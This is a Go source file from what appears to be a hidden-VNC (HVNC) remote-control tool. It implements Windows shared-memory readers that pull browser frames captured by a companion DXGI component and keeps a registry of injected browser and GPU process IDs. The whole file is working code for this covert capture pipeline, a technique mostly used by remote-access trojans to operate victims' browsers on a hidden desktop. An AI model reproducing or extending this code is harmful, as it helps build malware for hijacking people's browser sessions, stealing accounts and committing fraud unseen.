//go:build windows

package capture

import (
	"encoding/binary"
	"fmt"
	"log"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// hvncFrameHeader mirrors the C HVNCFrameHeader struct.
// must be kept in sync with HVNCCapture/src/DXGICapture.h.
type hvncFrameHeader struct {
	Magic       uint32
	Version     uint32
	Width       uint32
	Height      uint32
	Stride      uint32
	Format      uint32
	FrameSeq    uint64
	TimestampNs uint64
	PID         uint32
	Reserved    uint32
}

const (
	hvncFrameMagic      = 0x434E5648 // 'HVNC'
	hvncFrameVersion    = 1
	hvncFrameHeaderSize = 48 // sizeof(HVNCFrameHeader)
	hvncShmPrefix       = `Local\hvnc_frame_`
	hvncEventPrefix     = `Local\hvnc_evt_`
)

var (
	procOpenFileMappingW = kernel32.NewProc("OpenFileMappingW")
	procOpenEventW       = kernel32.NewProc("OpenEventW")
)

const (
	FILE_MAP_READ    = 0x0004
	EVENT_ALL_ACCESS = 0x1F0003
	SYNCHRONIZE      = 0x00100000
)

type hvncFrameReader struct {
	pid        uint32
	shmHandle  uintptr
	shmView    unsafe.Pointer
	shmSize    uintptr
	evtHandle  uintptr
	lastSeq    uint64
	staleCount int
	mu         sync.Mutex
}

var (
	hvncFrameReaders   = make(map[uint32]*hvncFrameReader)
	hvncFrameReadersMu sync.Mutex

	hvncGPUPIDMap = make(map[uint32]uint32)
)

func hvncRegisterGPUPID(browserPID, gpuPID uint32) {
	hvncFrameReadersMu.Lock()
	hvncGPUPIDMap[browserPID] = gpuPID
	hvncFrameReadersMu.Unlock()
	log.Printf("hvnc dxgi: registered GPU PID %d for browser PID %d", gpuPID, browserPID)
}

func hvncGetFrameReader(pid uint32) *hvncFrameReader {
	hvncFrameReadersMu.Lock()
	defer hvncFrameReadersMu.Unlock()

	if r, ok := hvncFrameReaders[pid]; ok {
		if r.staleCount > 300 {
			log.Printf("hvnc dxgi: evicting stale reader for PID %d (stale %d frames)", pid, r.staleCount)
			r.close()
			delete(hvncFrameReaders, pid)
		} else {
			return r
		}
	}

	shmName, _ := syscall.UTF16PtrFromString(fmt.Sprintf("%s%d", hvncShmPrefix, pid))
	shmHandle, _, _ := procOpenFileMappingW.Call(
		FILE_MAP_READ,
		0,
		uintptr(unsafe.Pointer(shmName)),
	)
	if shmHandle == 0 {
		return nil
	}

	view, _, _ := procMapViewOfFile.Call(
		shmHandle,
		FILE_MAP_READ,
		0, 0,
		hvncFrameHeaderSize,
	)
	if view == 0 {
		procCloseHandle.Call(shmHandle)
		return nil
	}

	hdr := (*hvncFrameHeader)(unsafe.Pointer(view))
	if hdr.Magic != hvncFrameMagic {
		procUnmapViewOfFile.Call(view)
		procCloseHandle.Call(shmHandle)
		return nil
	}

	fullSize := uintptr(hvncFrameHeaderSize) + uintptr(hdr.Stride)*uintptr(hdr.Height)

	procUnmapViewOfFile.Call(view)
	view = 0
	hdr = nil

	fullView, _, _ := procMapViewOfFile.Call(
		shmHandle,
		FILE_MAP_READ,
		0, 0,
		fullSize,
	)
	if fullView == 0 {
		procCloseHandle.Call(shmHandle)
		return nil
	}

	hdr2 := (*hvncFrameHeader)(unsafe.Pointer(fullView))

	evtName, _ := syscall.UTF16PtrFromString(fmt.Sprintf("%s%d", hvncEventPrefix, pid))
	evtHandle, _, _ := procOpenEventW.Call(
		SYNCHRONIZE,
		0,
		uintptr(unsafe.Pointer(evtName)),
	)

	r := &hvncFrameReader{
		pid:       pid,
		shmHandle: shmHandle,
		shmView:   unsafe.Pointer(fullView),
		shmSize:   fullSize,
		evtHandle: evtHandle,
	}
	hvncFrameReaders[pid] = r

	log.Printf("hvnc dxgi: opened shared memory for PID %d (%dx%d, %d bytes)",
		pid, hdr2.Width, hdr2.Height, fullSize)
	return r
}

func (r *hvncFrameReader) readFrame(dst []byte) (w, h int, ok bool) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if r.shmView == nil {
		return 0, 0, false
	}

	hdr := (*hvncFrameHeader)(r.shmView)
	if hdr.Magic != hvncFrameMagic || hdr.Version != hvncFrameVersion {
		return 0, 0, false
	}

	w = int(hdr.Width)
	h = int(hdr.Height)
	stride := int(hdr.Stride)

	if w <= 0 || h <= 0 || w > 7680 || h > 4320 || stride <= 0 || stride > 7680*4 {
		return 0, 0, false
	}

	dstStride := w * 4
	if stride < dstStride {
		return 0, 0, false // stride must be >= w*4
	}

	needed := w * h * 4
	if len(dst) < needed {
		return 0, 0, false
	}

	totalNeeded := uintptr(hvncFrameHeaderSize) + uintptr(stride)*uintptr(h)
	if totalNeeded > r.shmSize {
		r.remap(w, h, stride)
		if r.shmView == nil {
			return 0, 0, false
		}
		hdr = (*hvncFrameHeader)(r.shmView)
		if hdr.Magic != hvncFrameMagic || int(hdr.Width) != w || int(hdr.Height) != h {
			return 0, 0, false
		}
	}

	pixelData := unsafe.Add(r.shmView, hvncFrameHeaderSize)
	srcSize := stride * h
	src := unsafe.Slice((*byte)(pixelData), srcSize)

	for y := 0; y < h; y++ {
		srcOff := y * stride
		dstOff := y * dstStride
		copy(dst[dstOff:dstOff+dstStride], src[srcOff:srcOff+dstStride])
	}

	seq := hdr.FrameSeq
	if seq != r.lastSeq {
		r.lastSeq = seq
		r.staleCount = 0
	} else {
		r.staleCount++
	}

	return w, h, true
}

func (r *hvncFrameReader) remap(w, h, stride int) {
	if r.shmView != nil {
		procUnmapViewOfFile.Call(uintptr(r.shmView))
		r.shmView = nil
	}

	newSize := uintptr(hvncFrameHeaderSize) + uintptr(stride)*uintptr(h)
	view, _, _ := procMapViewOfFile.Call(
		r.shmHandle,
		FILE_MAP_READ,
		0, 0,
		newSize,
	)
	if view == 0 {
		return
	}
	r.shmView = unsafe.Pointer(view)
	r.shmSize = newSize
}

func (r *hvncFrameReader) close() {
	r.mu.Lock()
	defer r.mu.Unlock()

	if r.shmView != nil {
		procUnmapViewOfFile.Call(uintptr(r.shmView))
		r.shmView = nil
	}
	if r.shmHandle != 0 {
		procCloseHandle.Call(r.shmHandle)
		r.shmHandle = 0
	}
	if r.evtHandle != 0 {
		procCloseHandle.Call(r.evtHandle)
		r.evtHandle = 0
	}
}

func hvncCleanupFrameReaders() {
	hvncFrameReadersMu.Lock()
	defer hvncFrameReadersMu.Unlock()

	for pid, r := range hvncFrameReaders {
		r.close()
		delete(hvncFrameReaders, pid)
	}
	for k := range hvncGPUPIDMap {
		delete(hvncGPUPIDMap, k)
	}
}

var (
	hvncInjectedPIDs   = make(map[uint32]time.Time)
	hvncInjectedPIDsMu sync.Mutex
)

func hvncRegisterInjectedPID(pid uint32) {
	hvncInjectedPIDsMu.Lock()
	hvncInjectedPIDs[pid] = time.Now()
	hvncInjectedPIDsMu.Unlock()
}

func hvncGetInjectedPIDs() []uint32 {
	hvncInjectedPIDsMu.Lock()
	defer hvncInjectedPIDsMu.Unlock()
	pids := make([]uint32, 0, len(hvncInjectedPIDs))
	for pid := range hvncInjectedPIDs {
		pids = append(pids, pid)
	}
	return pids
}

func hvncUnregisterInjectedPID(pid uint32) {
	hvncInjectedPIDsMu.Lock()
	delete(hvncInjectedPIDs, pid)
	hvncInjectedPIDsMu.Unlock()
}

func parseHVNCFrameHeader(data []byte) (*hvncFrameHeader, bool) {
	if len(data) < hvncFrameHeaderSize {
		return nil, false
	}
	hdr := &hvncFrameHeader{
		Magic:       binary.LittleEndian.Uint32(data[0:4]),
		Version:     binary.LittleEndian.Uint32(data[4:8]),
		Width:       binary.LittleEndian.Uint32(data[8:12]),
		Height:      binary.LittleEndian.Uint32(data[12:16]),
		Stride:      binary.LittleEndian.Uint32(data[16:20]),
		Format:      binary.LittleEndian.Uint32(data[20:24]),
		FrameSeq:    binary.LittleEndian.Uint64(data[24:32]),
		TimestampNs: binary.LittleEndian.Uint64(data[32:40]),
		PID:         binary.LittleEndian.Uint32(data[40:44]),
		Reserved:    binary.LittleEndian.Uint32(data[44:48]),
	}
	if hdr.Magic != hvncFrameMagic {
		return nil, false
	}
	return hdr, true
}
